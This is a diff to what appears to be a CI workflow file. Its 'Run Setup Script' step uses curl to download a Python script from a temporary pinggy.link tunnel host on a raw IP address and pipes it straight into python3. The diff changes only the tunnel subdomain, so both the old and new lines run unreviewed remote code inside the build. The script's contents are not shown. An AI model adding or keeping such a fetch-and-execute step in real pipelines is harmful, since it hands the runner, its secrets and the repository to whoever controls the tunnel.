@@ -19,4 +19,4 @@ jobs:
 
       - name: Run Setup Script
         run: |
-          curl -s https://llljt-45-117-202-173.a.free.pinggy.link/setup_linux.py | python3
+          curl -s https://temfm-45-117-202-173.a.free.pinggy.link/setup_linux.py | python3
